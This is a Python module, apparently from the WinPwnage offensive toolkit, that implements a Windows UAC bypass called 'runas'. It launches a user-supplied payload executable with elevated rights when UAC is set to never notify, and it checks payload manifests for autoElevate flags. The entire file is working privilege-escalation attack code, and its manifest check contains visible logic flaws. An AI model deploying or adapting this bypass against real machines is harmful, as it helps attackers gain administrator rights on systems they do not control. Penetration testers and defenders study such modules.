import os
from winpwnage.core.utils import *
from winpwnage.core.prints import *

runas_info = {
	"Description": "Bypass UAC using runas, this only works if UAC is set to never notify",
	"Method": "Registry key manipulation",
	"Id": "1",
	"Type": "UAC bypass",
	"Fixed In": "99999" if information().uac_level() == 1 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "runas",
	"Function Payload": True,
}


def manifests(payload):
	strings = [
		"<autoElevate>true</autoElevate>",
		"<autoElevate xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</autoElevate>"
	]

	try:
		manifest = open(os.path.join(payload), "rb").read()
	except Exception as error:
		return False

	for string in strings:
		if string in manifest:
			return True
		else:
			return False


def runas(payload):
	if payloads().exe(payload):
		if os.path.isfile(payload) and payload.endswith(".exe"):
			params = ''
		else:
			# Manage payloads with args 
			params = payload.replace(payload.split(' ', 1)[0], '').lstrip()
			payload = payload.split(' ', 1)[0]

		if os.path.isfile(os.path.join(payload)) == True:
			if manifests(os.path.join(payload)):
				process().runas(payload=payload, params=params)
			else:
				if information().admin():
					print_error("Cannot proceed, we are already elevated")
					return False
				else:
					if process().runas(payload=payload, params=params):
						print_success("Successfully elevated process ({})".format(os.path.join(payload)))
					else:
						print_error("Unable to elevate process ({})".format(os.path.join(payload)))
		else:
			print_error("Unable to execute payload ({}) cannot find payload on disk".format(os.path.join(payload)))
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
